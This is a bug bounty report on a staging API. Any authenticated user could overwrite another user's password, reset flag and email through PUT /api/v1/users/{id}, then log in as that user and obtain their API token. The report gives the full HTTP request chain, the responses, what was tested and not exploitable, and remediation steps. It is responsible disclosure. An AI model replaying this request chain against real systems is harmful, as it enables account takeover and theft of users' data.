# BUG-008: FULL ACCOUNT TAKEOVER via cross-account user-record write (BOLA/BFLA on `PUT /api/v1/users/{id}`)

**Status:** CONFIRMED END-TO-END (attacker obtained a working session + API token for the victim account)
**Severity recommendation:** **P1 — Account Takeover / Broken Access Control**
**Target:** `https://bugbounty1.qe.optrostaging.ai`
**Endpoints:** `PUT /api/v1/users/{id}`, `POST /api/v1/users/login`, `GET /api/v1/users/{id}`, `GET /api/v1/files/{id}`
**Reporter:** zeno0
**Test accounts (provided by program):**
- Attacker: user **230** `golden-leaf-3068@bugcrowdninja.com` (role_id 5 "Owner")
- Victim: user **231** `golden-snow-4771@bugcrowdninja.com` (role_id 5 "Owner")

---

## Summary

The user-update endpoint `PUT /api/v1/users/{id}` performs **no object-level authorization** and mass-assigns authentication-critical fields:

1. Any authenticated user can **read any other user's record** (`GET /users/{id}` → 200, full PII + MFA/lockout state).
2. Any authenticated user can **rotate any other user's password** via `PUT /users/{id}` body `{"user":{"password":"..."}}` — **without knowing the current password** and with no re-authentication.
3. Any authenticated user can **clear the victim's `requires_password_change` forced-reset flag** via the same endpoint, removing the only server-side brake on the rotation.
4. The attacker then **logs in as the victim** (`POST /api/v1/users/login`) and receives **a fresh, valid API token for the victim's account** in the response (`session.token`).
5. As a second primitive, any authenticated user can **overwrite any other user's email address** (password-reset delivery hijack).

Net effect: **one owner-level account takes over every other account in the organization** (users are sequentially enumerated; `GET /users/query` returns the org roster — 316 users in this environment, including `role_id=1 "Superuser"`), yielding complete org compromise. MFA is not enforced (victim `mfa_enabled:false`; login performed no MFA challenge).

## Confirmed attack chain (reproduced live, all responses captured)

### Step 1 — Attacker B (230) reads victim A's (231) record
```
GET /api/v1/users/231 HTTP/1.1
Host: bugbounty1.qe.optrostaging.ai
token: 230:<attacker-token>
X-Optro-Bug-Bounty: zeno0
X-Auditboard-Product: System
Accept: application/json
```
→ `200` full record: email, `role_id:5`, `auth_type:"password"`, `mfa_enabled:false`, `requires_password_change:false`, `login_attempt`, `has_external_api_token`, `_permissions`.

### Step 2 — Attacker B rotates victim A's password (no current-password check, no ownership check)
```
PUT /api/v1/users/231 HTTP/1.1
Host: bugbounty1.qe.optrostaging.ai
token: 230:<attacker-token>
X-Optro-Bug-Bounty: zeno0
X-Auditboard-Product: System
Content-Type: application/json

{"user":{"password":"ZzZtmpPw2!"}}
```
→ `200` with the full updated victim record.

**Server-side proof the rotation really happened (oracle differential):**

| Login attempt as victim | Response | Meaning |
| --- | --- | --- |
| `POST /users/login` with `ZzZtmpPw2!` (value never seen before this PUT) | `401 {"error":"login_failed_password_change_required","message":"Your password has expired. Please reset your password to continue."}` | **password accepted** — flow blocked only by forced-reset flag |
| `POST /users/login` with garbage `NopeNope999!` | `401 {"error":"login_failed","message":"No user found for that email and password combination"}` | generic auth failure (control) |

Additionally: victim's **original API token was immediately invalidated** (`GET /api/v1/users/231` with old token → `401 Missing authentication`) the moment the password attribute was written, and the victim record flipped `requires_password_change:true`.

### Step 3 — Attacker B clears the forced-reset flag on the victim
```
PUT /api/v1/users/231 HTTP/1.1
Host: bugbounty1.qe.optrostaging.ai
token: 230:<attacker-token>
Content-Type: application/json

{"user":{"requires_password_change":false}}
```
→ `200`; victim record now `requires_password_change:false`.

### Step 4 — Attacker logs in AS the victim and receives the victim's fresh API token
```
POST /api/v1/users/login HTTP/1.1
Host: bugbounty1.qe.optrostaging.ai
Content-Type: application/json

{"credentials":{"email":"golden-snow-4771@bugcrowdninja.com","password":"ZzZtmpPw2!"}}
```
→ **`200`** with body:
```json
{"session": {"id":231, "full_name":"Bugcrowd Tester35", "email":"golden-snow-4771@bugcrowdninja.com", "role_id":5, ..., "token":"231:<fresh-victim-api-token>", "expires":1794086115}}
```
The `session.token` value is a **working API token for user 231** — verified: `GET /api/v1/users/231` with it → `200`.

### Step 5 — Second primitive: email hijack (password-reset delivery hijack)
```
PUT /api/v1/users/231 HTTP/1.1
token: 230:<attacker-token>
Content-Type: application/json

{"user":{"email":"ato-proof-131005@bugcrowdninja.com"}}
```
→ `200`, change persisted (read back via independent request), reverted afterwards. An attacker combining this with "Forgot password" receives the victim's reset link at an address they control — an alternative ATO path that requires no password attribute at all.

### Breadth (additional cross-account access with attacker-only credentials)
- `GET /api/v1/files/2660` / `2661` (files uploaded by victim in an unrelated feature) → `200` with file metadata from attacker's token.

## What was tested and NOT exploitable (reported honestly)

| Vector | Result |
| --- | --- |
| `{"user":{"role_id":1}}` (Superuser self-escalation via mass-assignment) | `422` — role_id not writable through this endpoint |
| `PUT` with unknown/empty body | `500` generic error — no stack trace |
| Response echo of password material | none (`"password"` occurrences in responses are only `auth_type:"password"`) |

Impact note: even though role escalation via this exact field is blocked, it is unnecessary for the chain — the attacker **takes over a Superuser account directly** using the same three requests against any enumerated Superuser id (same endpoint, same body, different `{id}`), obtaining Superuser password + API token + email control.

## Impact

- **Complete horizontal + vertical account takeover**: any authenticated user (role "Owner" / plain business user) → any other user in the org, including Superuser (role_id 1) and System Admin accounts.
- Attacker ends with: victim's password (chosen by attacker), victim's **fresh API token**, victim's **email control** (reset-delivery hijack), and the victim's original token invalidated (silent lockout of the real user — convenient for persistence).
- Org roster (316 users) is enumerable via `GET /api/v1/users/query`, so target selection is trivial.
- No MFA gate involved in the chain (victim `mfa_enabled:false`; the takeover login issued no MFA challenge).
- Everything is doable with a single low-privilege API token; no UI interaction required.

## Root cause

1. `PUT /api/v1/users/{id}` lacks an **object-level authorization check** (any user can submit writes against any user id).
2. `password` and `requires_password_change` are **mass-assignable** through the generic update endpoint; password change requires no `current_password` and no re-authentication.
3. `requires_password_change` — an authentication-state field — is writable by non-owners.

## Remediation

1. Enforce object-level authorization on `PUT /api/v1/users/{id}`: only the record owner (self-service profile fields) or a System Admin may write; deny all cross-user writes for regular roles.
2. Remove `password` and `requires_password_change` from mass-assignment; password changes must go through a dedicated endpoint that requires `current_password` (or an authenticated reset flow), and forced-reset flags must be server-managed only.
3. Require verified-email confirmation flow for email changes.
4. Invalidate tokens and sessions appropriately only through the sanctioned password-change flow (the current invalidation did work — the flaw is that the rotation itself was authorized).

## Reproduction summary (attacker prerequisites)

- 1 valid low-privilege API token (any org user).
- 3 HTTP requests to full ATO: `PUT /users/{victim}` (password) → `PUT /users/{victim}` (clear flag) → `POST /users/login` (session + token).
- Victim id obtained from `GET /api/v1/users/query` (org roster).
